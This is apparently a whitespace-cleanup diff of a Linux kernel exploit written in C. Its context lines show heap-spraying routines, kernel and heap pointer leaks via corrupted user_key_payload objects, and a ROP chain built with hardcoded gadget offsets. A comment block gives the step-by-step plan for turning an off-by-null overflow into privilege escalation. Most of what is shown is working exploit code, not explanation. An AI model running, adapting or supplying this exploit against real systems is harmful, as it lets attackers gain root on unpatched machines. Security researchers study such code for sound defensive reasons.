@@ -407,10 +407,10 @@ static int poll_threads;
 static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 /*
- * Note: In the exploit I use the assign_to_core() function to assign the 
- * process to another core before creating poll threads. This is useful to 
- * reduce noise due to thread creation on core 0 slabs. Once a thread has 
- * been created, it is assigned back to core-0 right before the poll() 
+ * Note: In the exploit I use the assign_to_core() function to assign the
+ * process to another core before creating poll threads. This is useful to
+ * reduce noise due to thread creation on core 0 slabs. Once a thread has
+ * been created, it is assigned back to core-0 right before the poll()
  * call using assign_thread_to_core(), a pthread_attr_setaffinity_np() wrapper.
  */
 static void* spray_poll_list(void* args)
@@ -437,7 +437,7 @@ static void* spray_poll_list(void* args)
     }
 
     assign_thread_to_core(randint(0x1, 0x3));
-    
+
     if (ta->suspend) {
         pthread_mutex_lock(&poll_mutex);
         poll_threads--;
@@ -452,7 +452,7 @@ static void* spray_poll_list(void* args)
 static void create_poll_thread(int i, thread_args_t *args)
 {
     int ret;
-    
+
     ret = pthread_create(&poll_tid[i], 0, spray_poll_list, (void *)args);
     if (ret != 0) {
         errExit("pthread_create");
@@ -464,7 +464,7 @@ static void join_poll_threads(void)
     int ret;
     for (int i = 0; i < poll_threads; i++) {
         ret = pthread_join(poll_tid[i], NULL);
-        
+
         if (ret < 0) {
             errExit("pthread_join");
         }
@@ -476,7 +476,7 @@ static void join_poll_threads(void)
 static uint64_t try_leak_kernel_ptr(void)
 {
     for (int i = 0; i < n_keys; i++) {
-        char *data = get_key(i, 0x10000); 
+        char *data = get_key(i, 0x10000);
         uint64_t *p_data = (uint64_t *)data;
 
         if (is_kernel_ptr(p_data[0x0])) {
@@ -495,10 +495,10 @@ static uint64_t try_leak_kernel_ptr(void)
 // leak tty_struct ptr using tty_file_private
 static uint64_t try_leak_heap_ptr(void)
 {
-    char *data = get_key(corrupted_key, 0x20000); 
+    char *data = get_key(corrupted_key, 0x20000);
     uint64_t *p_data = (uint64_t *)data;
     for (int i = 0; i < 0x20000 / sizeof(uint64_t); i++) {
-        //  a = tty struct ptr 
+        //  a = tty struct ptr
         uint64_t a = p_data[i];
         uint64_t b = p_data[i+1];
         uint64_t c = p_data[i+2];
@@ -522,22 +522,22 @@ static void build_rop(char* buf, uint64_t k_base, uint64_t target_obj)
 {
     // Stack pivot
     k_base -= 0xffffffff81000000;
-    
+
     printf("[+] Building rop \n");
 
     // overwrite ops pointer to point to gadget below - 0x8 because release
     // ptr is at offset 8 in pipe_buf_operations
-    *(uint64_t *)&buf[0x10] = target_obj + 0x30;    
+    *(uint64_t *)&buf[0x10] = target_obj + 0x30;
     // push target object ptr and jump to gadget below
-    // push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]     
+    // push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]
     // rsi = struct pipe_buffer
-    *(uint64_t *)&buf[0x38] = k_base + 0xffffffff81882840;     
+    *(uint64_t *)&buf[0x38] = k_base + 0xffffffff81882840;
     // point rsp to gadget below
-    // pop rsp ; ret 
-    *(uint64_t *)&buf[0x66] = k_base + 0xffffffff810007a9;    
+    // pop rsp ; ret
+    *(uint64_t *)&buf[0x66] = k_base + 0xffffffff810007a9;
     // jump to our rop
     // add rsp, 0x78 ; ret
-    *(uint64_t *)&buf[0x00] = k_base + 0xffffffff813c6b78; 
+    *(uint64_t *)&buf[0x00] = k_base + 0xffffffff813c6b78;
 
     uint64_t* rop = (uint64_t *)&buf[0x80];
 
@@ -599,7 +599,7 @@ static void build_rop(char* buf, uint64_t k_base, uint64_t target_obj)
  *  - Off-By-Null overflow in kmalloc-4k
  *
  * Exploit summary:
- *  - Use overflow to corrupt `next` pointer of poll_list object 
+ *  - Use overflow to corrupt `next` pointer of poll_list object
  *  - Free a user_key_payload based on corrupted `next` pointer
  *  - Spray seq_ops objects to overwrite freed user_key_payload obj
  *    - (*next) func ptr will corrupt user_key_payload->datalen
@@ -609,7 +609,7 @@ static void build_rop(char* buf, uint64_t k_base, uint64_t target_obj)
  *  - Free sprayed user_key_payloads except corrupted one
  *    - frees up kmalloc-4096 and kmalloc-32 caches
  *  - Spray tty_struct (4096) && tty_file_private (32)
- *  - Use oob read again to leak address of a tty_struct by reading tty pointer 
+ *  - Use oob read again to leak address of a tty_struct by reading tty pointer
  *    of tty_file_private struct
  *  - Free seq_ops objects and spray poll_list objects in order to overwrite
  *    UAFed user_key_payload now with a poll_list struct
@@ -628,7 +628,7 @@ static void build_rop(char* buf, uint64_t k_base, uint64_t target_obj)
  *    obj
  *  - Write rop chain to user_key_payload data
  */
-int main(void) 
+int main(void)
 {
     int ret;
     int fd;
@@ -656,7 +656,7 @@ int main(void)
     // otherwise will crash when freeing linked list of poll list
     puts("[+] Spraying user keys in kmalloc-32");
     for (int i = 0; i < 72; i++) {
-        // want this to error -> freed immediately again in order to set first 
+        // want this to error -> freed immediately again in order to set first
         // QWORD of user_key_payload to 0
         setxattr("/home/user/.bashrc", "user.x", buf, 32, XATTR_CREATE);
         // use user_key_payload to achieve arbitrary read
@@ -688,7 +688,7 @@ int main(void)
 
     puts("[+] Spraying more user keys in kmalloc-32");
     for (int i = 72; i < MAX_KEYS; i++) {
-        // want this to error -> freed immediately again in order to set first 
+        // want this to error -> freed immediately again in order to set first
         // QWORD of user_key_payload to 0
         setxattr("/home/user/.bashrc", "user.x", buf, 0x20, XATTR_CREATE);
         keys[i] = alloc_key(n_keys++, key, 0x20);
@@ -768,7 +768,7 @@ int main(void)
     puts("[+] Freeing corrupted key");
     // free UAFed key which will free poll_list struct we just allocated
     free_key(corrupted_key);
-    // GC key 
+    // GC key
     sleep(1);
 
 
